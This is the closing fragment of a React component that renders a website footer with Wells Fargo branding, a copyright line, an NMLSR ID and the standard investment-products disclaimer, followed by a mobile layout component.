                <span className="hover:text-[#d71e28] cursor-pointer">Accessibility</span>
              </div>
              <div>© 2026 Wells Fargo. All rights reserved. NMLSR ID 399801</div>
            </div>
            <p className="text-xs text-gray-400">
              Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
            </p>
          </div>
        </footer>
      </div>

      {/* Mobile Layout */}
      <MobileLayout />
    </>
  );
}
